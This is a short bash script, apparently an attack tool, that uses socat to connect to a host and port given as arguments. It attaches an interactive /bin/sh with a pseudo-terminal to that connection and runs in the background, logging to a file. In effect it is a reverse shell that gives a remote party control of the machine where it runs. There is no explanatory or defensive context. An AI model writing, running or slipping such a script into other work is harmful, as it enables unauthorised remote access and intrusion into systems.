#/bin/bash
#$host $port
host_port="$1:$2"
env TERM=linux ./socat "$host_port" exec:/bin/sh,pty,stderr,setsid,sigint,sane >../log.txt 2>&1 &
